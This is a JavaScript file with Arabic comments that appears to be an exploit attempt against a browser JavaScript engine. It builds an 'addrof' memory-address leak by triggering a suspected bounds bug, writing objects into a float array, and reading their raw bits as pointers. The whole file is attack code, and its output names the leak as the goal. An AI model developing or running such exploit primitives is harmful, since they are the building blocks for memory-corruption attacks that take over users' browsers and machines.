function improved_addrof() {
    let output = "🔍 **بداية تسريب العناوين المتقدم**\n\n";
    
    let arr = [];
    for (let i = 0; i < 2000; i++) arr[i] = i + 0.1;
    for (let i = 0; i < (1 << 22); i++) arr[i] = i + 0.1;
    
    // كائنات مختلفة للاختبار
    let target_objects = [
        {type: "OBJ_A", marker: 0x41414141, data: [1, 2, 3]},
        {type: "OBJ_B", marker: 0x42424242, value: "test_string"},
        {type: "OBJ_C", marker: 0x43434343, func: function(){ return 123; }},
        {type: "OBJ_D", marker: 0x44444444, big: 0x1122334455667788n}
    ];
    
    let victim = [1.1, 2.2, 3.3, 4.4];
    let largeLength = Object.keys(arr).length;
    let index = (largeLength << 3) >> 31;
    
    output += "📊 اختبار تسريب العناوين:\n\n";
    
    let leaked_addresses = [];
    
    for (let obj_idx = 0; obj_idx < target_objects.length; obj_idx++) {
        let obj = target_objects[obj_idx];
        
        // إعادة تعيين الضحية
        victim = [1.1, 2.2, 3.3, 4.4];
        
        // تطبيق الثغرة
        for (let i = 1; i >= index; i--) {
            victim[i] = obj;
        }
        
        // محاولات متعددة لتسريب العنوان
        let attempts = [
            {name: "المحاولة 1", value: victim[1]},
            {name: "المحاولة 2", value: victim[1] + 0}, // إضافة صفر
            {name: "المحاولة 3", value: victim[1] * 1}, // ضرب في 1
        ];
        
        output += `**${obj.type}** (marker: 0x${obj.marker.toString(16)}):\n`;
        
        for (let attempt of attempts) {
            let f64 = new Float64Array(1);
            let u32 = new Uint32Array(f64.buffer);
            
            f64[0] = attempt.value;
            
            if (isNaN(f64[0])) {
                let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
                output += `  ${attempt.name}: 0x${addr.toString(16)}\n`;
                
                if (addr !== 0x7ff8000000000000n) {
                    leaked_addresses.push({obj: obj, address: addr});
                    output += `  ✅ عنوان غير قياسي!\n`;
                }
            } else {
                output += `  ${attempt.name}: ${f64[0]} (ليس NaN)\n`;
            }
        }
        output += "\n";
    }
    
    // تحليل النتائج
    if (leaked_addresses.length > 0) {
        output += "🎯 **العناوين المسربة الحقيقية:**\n";
        for (let leak of leaked_addresses) {
            output += `• ${leak.obj.type}: 0x${leak.address.toString(16)}\n`;
        }
    } else {
        output += "❌ لم يتم تسريب عناوين حقيقية بعد\n";
        output += "📝 التوصية: جرب طرقًا مختلفة لإجبار التحويل إلى NaN\n";
    }
    
    alert(output);
    return leaked_addresses;
}

// تشغيل التسريب المحسن
improved_addrof();